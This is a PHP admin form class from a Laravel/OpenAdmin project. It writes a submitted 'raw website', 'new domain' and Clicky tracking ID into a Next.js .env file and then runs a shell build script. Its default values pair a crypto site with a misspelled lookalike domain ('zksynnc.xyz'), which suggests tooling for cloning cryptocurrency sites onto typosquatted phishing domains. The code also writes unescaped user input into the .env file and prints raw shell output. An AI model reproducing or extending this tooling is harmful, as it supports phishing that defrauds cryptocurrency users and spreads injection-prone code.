<?php

namespace App\Admin\Forms;

use Illuminate\Http\Request;
use OpenAdmin\Admin\Widgets\Form;

class AutoWebpacketFrom extends Form
{
    /**
     * The form title.
     *
     * @var string
     */
    public $title = '';

    /**
     * Handle the form request.
     *
     * @param Request $request
     *
     * @return \Illuminate\Http\RedirectResponse
     */
    public function handle(Request $request)
    {
        $raw_website = $request->post('raw_website');
        $new_domain = $request->post('new_domain');
        $clicky_id =  $request->post('clicky_id');

        $env_content = '
NEXT_PUBLIC_ENABLE_TESTNETS = false
NEXT_PUBLIC_DOMAIN_WEBSITE  = '.$raw_website.'
NEXT_PUBLIC_SOURCE  = '.$new_domain.'
NEXT_PUBLIC_CLICKY = '.$clicky_id;

        file_put_contents('../storage/webpacket_site/.env',$env_content);

        $shell = './webpacket.sh';
       // $shell = 'whoami';
        echo "<pre>";
        $output = shell_exec($shell);
        echo "</pre>";

        print_r($output);
       // admin_success('Processed successfully.');

       // return back();
    }

    /**
     * Build a form here.
     */
    public function form()
    {
        $this->text('raw_website')->rules('required');
        $this->text('new_domain')->rules('required');
        $this->text('clicky_id')->rules('required');
        //$this->email('email')->rules('email');
        $this->datetime('created_at');
    }

    /**
     * The data of the form.
     *
     * @return array $data
     */
    public function data()
    {
        return [
            'raw_website'       => 'https://www.zksync20.cash/',
            'new_domain'      => 'https://zksynnc.xyz',
            'clicky_id' => 101414583,
            'created_at' => now(),
        ];
    }
}
